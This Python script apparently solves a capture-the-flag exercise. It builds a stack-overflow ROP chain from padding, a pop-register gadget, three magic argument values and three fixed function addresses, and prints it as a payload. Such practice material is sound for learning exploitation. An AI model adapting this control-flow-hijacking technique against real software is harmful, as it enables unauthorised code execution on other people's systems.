import struct

pattern = "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaa"

num1   = "\xef\xbe\xad\xde\xef\xbe\xad\xde" #argument1
num2   = "\xbe\xba\xfe\xca\xbe\xba\xfe\xca" #argument2
num3   = "\x0d\xf0\x0d\xd0\x0d\xf0\x0d\xd0" #argument3

call_1 = "\x20\x07\x40\x00\x00\x00\x00\x00" #call1
call_2 = "\x40\x07\x40\x00\x00\x00\x00\x00" #call2
call_3 = "\xf0\x06\x40\x00\x00\x00\x00\x00" #call3

poprdi = "\x3c\x09\x40\x00\x00\x00\x00\x00" #pop the argument1
poprsi = "\x3d\x09\x40\x00\x00\x00\x00\x00" #pop the argument2
poprdx = "\x3e\x09\x40\x00\x00\x00\x00\x00" #pop the argument3

pops = poprdi + poprsi + poprdx
nums = num1 + num2 +num3
print(pattern+poprdi+nums+call_1+poprdi+nums+call_2+poprdi+nums+call_3)